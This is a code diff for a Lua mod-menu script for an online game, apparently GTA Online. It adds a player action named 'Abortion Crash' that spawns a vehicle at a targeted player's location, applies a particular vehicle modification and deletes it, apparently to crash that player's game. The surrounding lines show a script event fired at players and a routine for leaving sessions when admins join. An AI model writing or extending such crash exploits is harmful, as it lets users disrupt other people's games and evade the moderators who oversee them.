@@ -832,6 +832,22 @@ local function player(pid)
         util.trigger_script_event(1 << pid, {111242367, pid, -210634234})
     end)
 
+    menu.action(player_removals, "Abortion Crash", {}, "", function()
+        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
+        local hakuchou = util.joaat("hakuchou2")
+    
+        STREAMING.REQUEST_MODEL(hakuchou)
+        while not STREAMING.HAS_MODEL_LOADED(hakuchou) do
+            util.yield()
+        end
+    
+        local vehicle = entities.create_vehicle(hakuchou, pos, 0)
+        VEHICLE.SET_VEHICLE_MOD(vehicle, 34, 3, false)
+        util.yield(1000)
+        entities.delete_by_handle(vehicle)
+    end) 
+    
+
     if bailOnAdminJoin then
         for i, data in ipairs(stinky_admins) do
             local name = data[1]
